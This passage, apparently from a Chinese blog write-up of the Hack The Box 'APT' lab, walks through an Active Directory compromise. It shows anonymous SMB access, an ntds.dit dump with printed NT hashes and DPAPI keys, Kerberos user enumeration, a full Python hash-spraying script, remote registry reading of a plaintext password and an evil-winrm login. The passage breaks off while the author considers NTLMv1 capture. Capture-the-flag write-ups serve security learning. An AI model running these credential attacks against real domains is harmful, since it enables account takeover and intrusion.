MaxTempTableSize</span><br><span class="line">supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">supportedLDAPPolicies: MinResultSets</span><br><span class="line">supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">supportedLDAPPolicies: MaxValRange</span><br><span class="line">supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">highestCommittedUSN: 118893</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">dnsHostName: apt.htb.local</span><br><span class="line">ldapServiceName: htb.local:apt$@HTB.LOCAL</span><br><span class="line">serverName: CN=APT,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configura</span><br><span class="line"> tion,DC=htb,DC=local</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.800</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1670</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1791</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1935</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2080</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2237</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 2</span><br><span class="line"># numEntries: 1</span><br></pre></td></tr></table></figure>

<p>dc应该是 <code>apt.htb.local</code> ，域名 <code>htb.local</code>，加host</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ smbclient -L \\apt.htb.local -U &#x27;&#x27; -N</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        backup          Disk      </span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        SYSVOL          Disk      Logon server share</span><br></pre></td></tr></table></figure>

<h2 id="匿名访问smb"><a href="#匿名访问smb" class="headerlink" title="匿名访问smb"></a>匿名访问smb</h2><p>smb允许匿名访问，并且共享了一个 <code>backup</code> 目录给匿名用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-smbclient <span class="string">&#x27;&#x27;</span>@apt.htb.local</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">Type <span class="built_in">help</span> <span class="keyword">for</span> list of commands</span><br><span class="line"><span class="comment"># shares</span></span><br><span class="line">backup</span><br><span class="line">IPC$</span><br><span class="line">NETLOGON</span><br><span class="line">SYSVOL</span><br><span class="line"><span class="comment"># use backup</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">drw-rw-rw-          0  Thu Sep 24 03:31:03 2020 .</span><br><span class="line">drw-rw-rw-          0  Thu Sep 24 03:31:03 2020 ..</span><br><span class="line">-rw-rw-rw-   10650961  Thu Sep 24 03:31:03 2020 backup.zip</span><br></pre></td></tr></table></figure>

<p>backup.zip 是个ntd的转储</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─$ zipinfo backup.zip </span><br><span class="line">Archive:  backup.zip</span><br><span class="line">Zip file size: 10650961 bytes, number of entries: 6</span><br><span class="line">drwx---     6.3 fat        0 bx stor 20-Sep-23 19:40 Active Directory/</span><br><span class="line">-rw----     6.3 fat 50331648 Bx defN 20-Sep-23 19:38 Active Directory/ntds.dit</span><br><span class="line">-rw----     6.3 fat    16384 Bx defN 20-Sep-23 19:38 Active Directory/ntds.jfm</span><br><span class="line">drwx---     6.3 fat        0 bx stor 20-Sep-23 19:40 registry/</span><br><span class="line">-rw----     6.3 fat   262144 Bx defN 20-Sep-23 19:22 registry/SECURITY</span><br><span class="line">-rw----     6.3 fat 12582912 Bx defN 20-Sep-23 19:22 registry/SYSTEM</span><br></pre></td></tr></table></figure>

<p>zip2john导出一下hash，跑出来压缩包密码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iloveyousomuch</span><br></pre></td></tr></table></figure>

<h2 id="获取可用账户"><a href="#获取可用账户" class="headerlink" title="获取可用账户"></a>获取可用账户</h2><p>导一下hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump LOCAL -ntds Active\ Directory/ntds.dit -system registry/SYSTEM -security registry/SECURITY  &gt; <span class="built_in">hash</span></span><br></pre></td></tr></table></figure>

<p>导出来的凭据忒多，看了下大</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">└─$ head -30 hash</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[*] Target system bootKey: 0x936ce5da88593206567f650411e1d16b</span><br><span class="line">[*] Dumping cached domain logon information (domain/username:hash)</span><br><span class="line">[*] Dumping LSA Secrets</span><br><span class="line">[*] $MACHINE.ACC </span><br><span class="line">$MACHINE.ACC:plain_password_hex:34005b00250066006f0027007a004700600026004200680052003300630050005b002900550032004e00560053005c004c00450059004f002f0026005e0029003c00390078006a0036002500230039005c005c003f0075004a0034005900500062006000440052004b00220020004900450053003200660058004b00220066002c005800280051006c002a0066006700300052006600520071003d0021002c004200650041005600460074005e0045005600520052002d004c0029005600610054006a0076002f005100470039003d006f003b004700400067003e005600610062002d00550059006300200059006400</span><br><span class="line">$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb</span><br><span class="line">[*] DefaultPassword </span><br><span class="line">(Unknown User):Password123!</span><br><span class="line">[*] DPAPI_SYSTEM </span><br><span class="line">dpapi_machinekey:0x3e0d78cb8f3ed66196584c44b5701501789fc102</span><br><span class="line">dpapi_userkey:0xdcde3fc585c430a72221a48691fb202218248d46</span><br><span class="line">[*] NL$KM </span><br><span class="line"> 0000   73 4F 34 1D 09 C8 F9 32  23 B9 25 0B DF E2 DC 58   sO4....2#.%....X</span><br><span class="line"> 0010   44 41 F2 E0 C0 93 CF AD  2F 2E EB 13 81 77 4B 42   DA....../....wKB</span><br><span class="line"> 0020   C2 E0 6D DE 90 79 44 42  F4 C2 AD 4D 7E 3C 6F B2   ..m..yDB...M~&lt;o.</span><br><span class="line"> 0030   39 CE 99 95 66 8E AF 7F  1C E0 F6 41 3A 25 DA A8   9...f......A:%..</span><br><span class="line">NL$KM:734f341d09c8f93223b9250bdfe2dc584441f2e0c093cfad2f2eeb1381774b42c2e06dde90794442f4c2ad4d7e3c6fb239ce9995668eaf7f1ce0f6413a25daa8</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Searching for pekList, be patient</span><br><span class="line">[*] PEK # 0 found and decrypted: 1733ad403c773dde94dddffa2292ffe9</span><br><span class="line">[*] Reading and decrypting hashes from Active Directory/ntds.dit </span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">APT$:1000:aad3b435b51404eeaad3b435b51404ee:b300272f1cdab4469660d55fe59415cb:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:72791983d95870c0d6dd999e4389b211:::</span><br><span class="line">jeb.sloan:3200:aad3b435b51404eeaad3b435b51404ee:9ea25adafeec63e38cef4259d3b15c30:::</span><br><span class="line">ranson.mejia:3201:aad3b435b51404eeaad3b435b51404ee:3ae49ec5e6fed82ceea0dc2be77750ab:::</span><br></pre></td></tr></table></figure>

<p>8k多条挨个登陆验证不显示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ wc -l hash                     </span><br><span class="line">8021 hash</span><br></pre></td></tr></table></figure>

<p>所以验证的话还是首先验证用户是否存在</p>
<p>在这之前先同步下时间，不知道为什么ntpdate一直报错</p>
<p>所以用web的返回时间同步</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">─$ curl 10.10.10.213 -sv|<span class="built_in">head</span> -10</span><br><span class="line">*   Trying 10.10.10.213:80...</span><br><span class="line">* Connected to 10.10.10.213 (10.10.10.213) port 80</span><br><span class="line">* using HTTP/1.x</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 10.10.10.213</span><br><span class="line">&gt; User-Agent: curl/8.11.1</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Request completely sent off</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Last-Modified: Mon, 23 Dec 2019 11:29:26 GMT</span><br><span class="line">&lt; Accept-Ranges: bytes</span><br><span class="line">&lt; ETag: <span class="string">&quot;0ef5b3b84b9d51:0&quot;</span></span><br><span class="line">&lt; Server: Microsoft-IIS/10.0</span><br><span class="line">&lt; Date: Thu, 01 Jun 2025 07:21:29 GMT</span><br><span class="line">&lt; Content-Length: 14879</span><br><span class="line">&lt; </span><br><span class="line">&#123; [3776 bytes data]</span><br><span class="line">&lt;!--</span><br><span class="line">Author: W3layouts</span><br><span class="line">Author URL: http://w3layouts.com</span><br><span class="line">License: Creative Commons Attribution 3.0 Unported</span><br><span class="line">License URL: http://creativecommons.org/licenses/by/3.0/</span><br><span class="line">--&gt;</span><br><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Mirrored from 10.13.38.16/ by HTTrack Website Copier/3.x [XR&amp;CO<span class="string">&#x27;2014], Mon, 23 Dec 2019 08:12:54 GMT --&gt;</span></span><br><span class="line"><span class="string">s* Failure writing output to destination, passed 2668 returned 1842</span></span><br><span class="line"><span class="string">* closing connection #0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo date -s &quot;Thu, 01 Jun 2025 07:21:22 GMT&quot;</span><br><span class="line">[sudo] password for fonllge: </span><br><span class="line">Thu Jun  1 03:21:22 EDT 2025</span><br></pre></td></tr></table></figure>

<p>然后将筛选出的用户跑一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">└─$ kerbrute userenum --dc apt.htb -d htb.local users    </span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 06/01/25 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2025/06/01 13:41:50 &gt;  Using KDC(s):</span><br><span class="line">2025/06/01 13:41:50 &gt;   apt.htb:88</span><br><span class="line"></span><br><span class="line">2025/06/01 13:41:56 &gt;  [+] VALID USERNAME:       Administrator@htb.local</span><br><span class="line">2025/06/01 13:41:56 &gt;  [+] VALID USERNAME:       APT$@htb.local</span><br><span class="line">2025/06/01 13:45:51 &gt;  [+] VALID USERNAME:       henry.vinson@htb.local</span><br></pre></td></tr></table></figure>

<p>这只跑出来仨账户，说明确实并非导出凭据内的用户此刻都还在这个域中，仅留了一个 <code>henry.vinson</code> 。</p>
<h3 id="撞-henry-vinson-账户可用-hash"><a href="#撞-henry-vinson-账户可用-hash" class="headerlink" title="撞 henry.vinson 账户可用 hash"></a>撞 henry.vinson 账户可用 hash</h3><p>尝试用他的账户hash进行登录，会报凭据不对</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-getTGT <span class="string">&#x27;htb.local/henry.vinson&#x27;</span> -hashes :2de80758521541d19cabba480b260e8f -dc-ip apt.htb.local </span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)</span><br></pre></td></tr></table></figure>

<p>其他两个账户同样也是登录不上，既然历史的登陆hash不上那这里优先考虑用其他账户的hash来撞。</p>
<p>kerbrute不支持直接通过hash进行撞凭证的方式。</p>
<p>xct的wp中是通过修改了下方的脚本来实现撞hash</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/HashSpray.py">https://github.com/cube0x0/HashSpray.py</a></p>
</blockquote>
<p>这里采取了一样的方式，这里还可以用bash来跑<code>impacket-tgt</code>，不过py确实方便些</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/python3</span></span><br><span class="line">from __future__ import division</span><br><span class="line">from __future__ import print_function</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">from binascii import unhexlify</span><br><span class="line">from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError</span><br><span class="line">from impacket.krb5 import constants</span><br><span class="line">from impacket.krb5.types import Principal</span><br><span class="line">import multiprocessing</span><br><span class="line">import socket</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">DOMAIN = <span class="string">&quot;htb.local&quot;</span></span><br><span class="line">username = <span class="string">&quot;henry.vinson&quot;</span></span><br><span class="line">hashfile = <span class="string">&quot;/Desktop/htb/APT/hashes&quot;</span></span><br><span class="line"></span><br><span class="line">def login(username, password, domain, lmhash, nthash, aesKey, dc_ip):</span><br><span class="line">    try:</span><br><span class="line">        dc_ip = <span class="string">&quot;dead:beef::5c15:ad15:b39b:b275&quot;</span></span><br><span class="line">        kerb_principal = Principal(username, <span class="built_in">type</span>=constants.PrincipalNameType.NT_PRINCIPAL.value)</span><br><span class="line">        getKerberosTGT(kerb_principal, password, domain,</span><br><span class="line">            unhexlify(lmhash), unhexlify(nthash), aesKey, dc_ip)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+]Success %s/%s&#x27;</span> % (domain, username))</span><br><span class="line">        <span class="built_in">return</span> True  </span><br><span class="line">    except KerberosError as e:</span><br><span class="line">        <span class="keyword">if</span> (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_CLIENT_REVOKED.value) or (e.getErrorCode() == constants.ErrorCodes.KDC_ERR_WRONG_REALM.value):</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;[-]Could not find username: %s/%s&quot;</span> % (domain, username))</span><br><span class="line">        <span class="keyword">elif</span> e.getErrorCode() == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line">            <span class="built_in">return</span> False</span><br><span class="line">    except socket.error as e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-]Could not connect to DC&#x27;</span>)</span><br><span class="line">        <span class="built_in">return</span> False</span><br><span class="line"></span><br><span class="line">def _login(username, <span class="built_in">hash</span>):</span><br><span class="line">    <span class="built_in">return</span> login(username, <span class="string">&#x27;&#x27;</span>, DOMAIN, <span class="string">&#x27;&#x27;</span>, <span class="built_in">hash</span>, None, <span class="string">&quot;apt.htb&quot;</span>)</span><br><span class="line"></span><br><span class="line">passwords = [x.strip() <span class="keyword">for</span> x <span class="keyword">in</span> open(hashfile, <span class="string">&quot;r&quot;</span>).readlines()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> passwords:</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    <span class="keyword">if</span> _login(username, i):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+]Success %s,%s&quot;</span> % (username, i))</span><br><span class="line">        <span class="built_in">exit</span>()  </span><br></pre></td></tr></table></figure>

<p>等了蛮久得到一个可用hash</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 kerbspray.py</span><br><span class="line">[+]Success htb.local/henry.vinson</span><br><span class="line">[+]Success henry.vinson,e53d87d42adaa3ca32bdb34a876cbffb</span><br></pre></td></tr></table></figure>

<h2 id="远程读取注册表获取-henry-vinson-adm-凭证"><a href="#远程读取注册表获取-henry-vinson-adm-凭证" class="headerlink" title="远程读取注册表获取 henry.vinson_adm 凭证"></a>远程读取注册表获取 henry.vinson_adm 凭证</h2><p>但是这个账户没有winrm等访问权限。</p>
<p>这部分看了 <a target="_blank" rel="noopener" href="https://0xdf.gitlab.io/2021/04/10/htb-apt.html">0xdf</a> 的wp</p>
<p>是通过远程读取 <code>HKEY_CURRENT_USER</code> 注册表</p>
<p>说实话能没想到注册表里还会有能用的东西..</p>
<p>对于注册表可以参考微软的下文</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/troubleshoot/windows-server/performance/windows-registry-advanced-users">https://learn.microsoft.com/zh-tw/troubleshoot/windows-server/performance/windows-registry-advanced-users</a></p>
</blockquote>
<p>导出所有HKCU的注册表（）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─$ impacket-reg -debug htb.local/henry.vinson@htb.local -hashes :e53d87d42adaa3ca32bdb34a876cbffb  query -keyName HKCU -s &gt; reg</span><br></pre></td></tr></table></figure>

<blockquote>
<p>HKEY_CURRENT_USER	針對目前登入的使用者，包含設定資訊根目錄。 使用者的資料夾、螢幕色彩和控制面板設定會儲存在這裡。 此資訊連結使用者的設定檔。 此金鑰有時會縮寫為 HKCU。</p>
</blockquote>
<p>grep关键字，会发现在其中有个 <code>GiganticHostingManagementSystem</code> 里面放了俩key,其中包含一个账户密码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">└─$ grep -i -a password reg -A5 -B5</span><br><span class="line">\Keyboard Layout\Toggle\</span><br><span class="line">\Network\</span><br><span class="line">\Software\</span><br><span class="line">\Software\GiganticHostingManagementSystem\</span><br><span class="line">        UserName        REG_SZ   henry.vinson_adm</span><br><span class="line">        PassWord        REG_SZ   G1<span class="comment">#Ny5@2dvht</span></span><br><span class="line">\Software\Microsoft\</span><br><span class="line">\Software\Microsoft\Active Setup\</span><br><span class="line">\Software\Microsoft\Active Setup\Installed Components\</span><br><span class="line">\Software\Microsoft\Active Setup\Installed Components\&#123;89820200-ECBD-11cf-8B85-00AA005B4340&#125;\</span><br><span class="line">        Version REG_SZ   10,0,14393,4283</span><br></pre></td></tr></table></figure>

<h2 id="GetUser"><a href="#GetUser" class="headerlink" title="GetUser"></a>GetUser</h2><p>使用得到的 <code>henry.vinson_adm</code> 账户登录</p>
<p><code>henry.vinson_adm / G1#Ny5@2dvht</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─<span class="variable">$</span> evil<span class="literal">-winrm</span> <span class="literal">-u</span> henry.vinson_adm <span class="literal">-p</span> <span class="string">&#x27;G1#Ny5@2dvht&#x27;</span>  <span class="literal">-i</span> apt.htb.local</span><br><span class="line"></span><br><span class="line">Evil<span class="literal">-WinRM</span> shell v3.<span class="number">7</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\henry.vinson_adm\Documents&gt; cmd /c <span class="built_in">set</span> computer</span><br><span class="line">COMPUTERNAME=APT</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\henry.vinson_adm\desktop&gt; <span class="built_in">cat</span> u*</span><br><span class="line"><span class="number">79</span>ad7bd3345b34f9d4a1c2ac6e8d97b7</span><br></pre></td></tr></table></figure>

<h1 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h1><p>查看当前用户配置</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\henry.vinson_adm\appdata\local&gt; <span class="built_in">Get-PSReadLineOption</span></span><br><span class="line">EditMode                               : Windows</span><br><span class="line">ContinuationPrompt                     : &gt;&gt;</span><br><span class="line">ContinuationPromptForegroundColor      : Gray</span><br><span class="line">ContinuationPromptBackgroundColor      : Black</span><br><span class="line">ExtraPromptLineCount                   : <span class="number">0</span></span><br><span class="line">AddToHistoryHandler                    :</span><br><span class="line">CommandValidationHandler               :</span><br><span class="line">CommandsToValidateScriptBlockArguments : &#123;<span class="built_in">ForEach-Object</span>, %, <span class="built_in">Invoke-Command</span>, <span class="built_in">icm</span>...&#125;</span><br><span class="line">HistoryNoDuplicates                    : False</span><br><span class="line">MaximumHistoryCount                    : <span class="number">4096</span></span><br><span class="line">MaximumKillRingCount                   : <span class="number">10</span></span><br><span class="line">HistorySearchCursorMovesToEnd          : False</span><br><span class="line">ShowToolTips                           : False</span><br><span class="line">DingTone                               : <span class="number">1221</span></span><br><span class="line">CompletionQueryItems                   : <span class="number">100</span></span><br><span class="line">WordDelimiters                         : ;:,.[]&#123;&#125;()/\|^&amp;*-=+<span class="string">&#x27;&quot;–—―</span></span><br><span class="line"><span class="string">DingDuration                           : 50</span></span><br><span class="line"><span class="string">BellStyle                              : Audible</span></span><br><span class="line"><span class="string">HistorySearchCaseSensitive             : False                                            </span></span><br><span class="line"><span class="string">ViModeIndicator                        : None</span></span><br><span class="line"><span class="string">HistorySavePath                        : C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ServerRemoteHost_history.txt</span></span><br></pre></td></tr></table></figure>

<p>访问命令执行记录查看到，之前这个账户用administrator用户的凭证执行过注册表的变更</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\henry.vinson_adm\appdata\Roaming\Microsoft\Windows\PowerShell\PSReadline&gt; <span class="built_in">cat</span> ConsoleHost_history.txt</span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">get-credential</span> administrator</span><br><span class="line"><span class="built_in">invoke-command</span> <span class="literal">-credential</span> <span class="variable">$Cred</span> <span class="literal">-computername</span> localhost <span class="literal">-scriptblock</span> &#123;<span class="built_in">Set-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&quot;</span> lmcompatibilitylevel <span class="literal">-Type</span> DWORD <span class="literal">-Value</span> <span class="number">2</span> <span class="literal">-Force</span>&#125;</span><br></pre></td></tr></table></figure>

<p>翻了下文档</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/troubleshoot/windows-client/windows-security/enable-ntlm-2-authentication">https://learn.microsoft.com/zh-tw/troubleshoot/windows-client/windows-security/enable-ntlm-2-authentication</a></p>
</blockquote>
<p>这个是通过admin用户修改了Lsa注册表内 <code>lmcompatibilitylevel</code>的值为2，这个对应的如下</p>
<blockquote>
<p>層級 2 - 僅傳送 NTLM 回應。 用戶端只使用 NTLM 驗證，並在伺服器支援時使用 NTLM 2 工作階段安全性;域控制器接受 LM、NTLM 和 NTLM 2 驗證。</p>
</blockquote>
<p>也就是会使用 <code>ntlmv1</code>来进行身份验证，那必然是相对<code>ntlmv2</code>来说会肥肠容易破解</p>
<p>但是这该如何利用，如何触发一个高权重的账户发起客户端的验证请求，至我的kali来捕获这个请求的ntlmv1</p>
